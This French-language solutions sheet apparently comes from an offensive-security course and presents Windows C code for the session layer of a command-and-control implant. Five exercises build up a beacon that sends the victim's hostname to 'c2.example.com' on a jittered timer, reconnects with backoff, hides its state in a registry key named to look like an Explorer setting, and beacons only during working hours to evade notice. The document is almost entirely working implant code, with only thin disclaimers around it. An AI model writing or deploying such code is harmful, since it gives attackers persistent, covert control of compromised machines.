# Solutions : Session Management

## Avertissement

Code educatif uniquement. Usage illegal = poursuites penales.

---

## Solution Exercice 1 : Generation Session ID

```c
#include <windows.h>
#include <rpc.h>
#include <stdio.h>

#pragma comment(lib, "rpcrt4.lib")

void GenerateSessionID(char* sessionId, size_t size) {
    UUID uuid;
    UuidCreate(&uuid);

    unsigned char* str;
    UuidToStringA(&uuid, &str);
    strncpy(sessionId, (char*)str, size - 1);
    sessionId[size - 1] = '\0';
    RpcStringFreeA(&str);
}

int main() {
    char sessionId[64];

    printf("[*] Generating 10 Session IDs:\n");
    for (int i = 0; i < 10; i++) {
        GenerateSessionID(sessionId, sizeof(sessionId));
        printf("%d: %s\n", i + 1, sessionId);
    }

    return 0;
}
```

---

## Solution Exercice 2 : Heartbeat Simple

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")

typedef struct {
    char session_id[64];
    char hostname[256];
    time_t last_seen;
} SessionMetadata;

int SendHeartbeat(const wchar_t* server, SessionMetadata* session) {
    char jsonData[512];
    snprintf(jsonData, sizeof(jsonData),
             "{\"session_id\":\"%s\",\"hostname\":\"%s\",\"timestamp\":%lld}",
             session->session_id, session->hostname, (long long)time(NULL));

    HINTERNET hSession = WinHttpOpen(L"Agent/1.0",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, server,
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/heartbeat",
                                             NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    BOOL result = WinHttpSendRequest(hRequest, NULL, 0, jsonData, strlen(jsonData),
                                      strlen(jsonData), 0);

    if (result) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result ? 0 : -1;
}

int CalculateJitteredSleep(int base, int jitterPercent) {
    int jitterRange = (base * jitterPercent) / 100;
    int jitter = (rand() % (2 * jitterRange + 1)) - jitterRange;
    return base + jitter;
}

int main() {
    SessionMetadata session = {0};
    strcpy(session.session_id, "550e8400-e29b-41d4-a716-446655440000");
    GetComputerNameA(session.hostname, &(DWORD){sizeof(session.hostname)});

    srand(time(NULL));

    while (1) {
        int sleepTime = CalculateJitteredSleep(60, 30);  // 60s +/- 30%
        printf("[*] Sleeping %d seconds...\n", sleepTime);
        Sleep(sleepTime * 1000);

        printf("[*] Sending heartbeat...\n");
        if (SendHeartbeat(L"c2.example.com", &session) == 0) {
            session.last_seen = time(NULL);
            printf("[+] Heartbeat OK at %lld\n", (long long)session.last_seen);
        } else {
            printf("[!] Heartbeat failed\n");
        }
    }

    return 0;
}
```

---

## Solution Exercice 3 : Reconnexion avec Backoff

```c
int ReconnectWithBackoff(const wchar_t* server, SessionMetadata* session, int maxRetries) {
    int attempt = 0;
    int waitTime = 1;

    while (attempt < maxRetries || maxRetries == -1) {
        printf("[*] Reconnection attempt %d (wait %ds)...\n", attempt + 1, waitTime);

        if (SendHeartbeat(server, session) == 0) {
            printf("[+] Reconnected successfully!\n");
            return 0;
        }

        Sleep(waitTime * 1000);
        attempt++;
        waitTime = (waitTime * 2 > 60) ? 60 : waitTime * 2;  // Cap at 60s
    }

    printf("[!] Max retries reached\n");
    return -1;
}

void HeartbeatLoopWithResilience(const wchar_t* server, SessionMetadata* session) {
    int failures = 0;

    while (1) {
        Sleep(CalculateJitteredSleep(60, 30) * 1000);

        if (SendHeartbeat(server, session) == 0) {
            failures = 0;
            printf("[+] Heartbeat OK\n");
        } else {
            failures++;
            printf("[!] Heartbeat failed (%d/5)\n", failures);

            if (failures >= 5) {
                printf("[!] Attempting reconnection...\n");
                if (ReconnectWithBackoff(server, session, 10) != 0) {
                    printf("[!] Giving up\n");
                    break;
                }
                failures = 0;
            }
        }
    }
}
```

---

## Solution Exercice 4 : Persistence Registry

```c
#include <windows.h>
#include <stdio.h>

int SaveSessionToRegistry(SessionMetadata* session) {
    HKEY hKey;
    LONG result = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo"),
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
    );

    if (result != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyEx failed: %ld\n", result);
        return -1;
    }

    RegSetValueExA(hKey, "SessionGUID", 0, REG_SZ,
                   (BYTE*)session->session_id, strlen(session->session_id) + 1);

    RegSetValueExA(hKey, "LastSync", 0, REG_QWORD,
                   (BYTE*)&session->last_seen, sizeof(session->last_seen));

    RegCloseKey(hKey);
    printf("[+] Session saved to Registry\n");
    return 0;
}

int LoadSessionFromRegistry(SessionMetadata* session) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo"),
        0, KEY_READ, &hKey
    );

    if (result != ERROR_SUCCESS) {
        printf("[!] No saved session found\n");
        return -1;
    }

    DWORD size = sizeof(session->session_id);
    RegQueryValueExA(hKey, "SessionGUID", NULL, NULL,
                     (BYTE*)session->session_id, &size);

    size = sizeof(session->last_seen);
    RegQueryValueExA(hKey, "LastSync", NULL, NULL,
                     (BYTE*)&session->last_seen, &size);

    RegCloseKey(hKey);
    printf("[+] Session loaded from Registry: %s\n", session->session_id);
    return 0;
}
```

---

## Solution Exercice 5 : Session Complete

```c
#include <windows.h>
#include <winhttp.h>
#include <rpc.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "rpcrt4.lib")

BOOL IsWorkingHours() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    return (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 &&
            st.wHour >= 9 && st.wHour < 17);
}

SessionMetadata InitialCheckIn(const wchar_t* server) {
    SessionMetadata session = {0};

    // Generate UUID
    UUID uuid;
    UuidCreate(&uuid);
    unsigned char* str;
    UuidToStringA(&uuid, &str);
    strcpy(session.session_id, (char*)str);
    RpcStringFreeA(&str);

    // Collect metadata
    DWORD size = sizeof(session.hostname);
    GetComputerNameA(session.hostname, &size);
    session.last_seen = time(NULL);

    printf("[+] Initial check-in: %s\n", session.session_id);
    SaveSessionToRegistry(&session);

    return session;
}

int main() {
    SessionMetadata session;

    // Try load existing session
    if (LoadSessionFromRegistry(&session) != 0) {
        session = InitialCheckIn(L"c2.example.com");
    }

    // Main loop
    while (1) {
        // Working hours check
        if (!IsWorkingHours()) {
            printf("[*] Outside working hours. Sleeping 1h...\n");
            Sleep(3600 * 1000);
            continue;
        }

        // Heartbeat with resilience
        HeartbeatLoopWithResilience(L"c2.example.com", &session);

        // Update persistence
        SaveSessionToRegistry(&session);
    }

    return 0;
}
```

---

## Points Cles

1. **UUID** : Generer IDs uniques avec RPC API
2. **Heartbeat** : Loop periodique avec jitter
3. **Backoff** : Exponentiel avec cap (1s -> 60s max)
4. **Persistence** : Registry pour survivre reboot
5. **Working Hours** : Ne beacon que 9-5 weekdays

---

**AVERTISSEMENT** : Code educatif. Usage illegal = consequences graves.
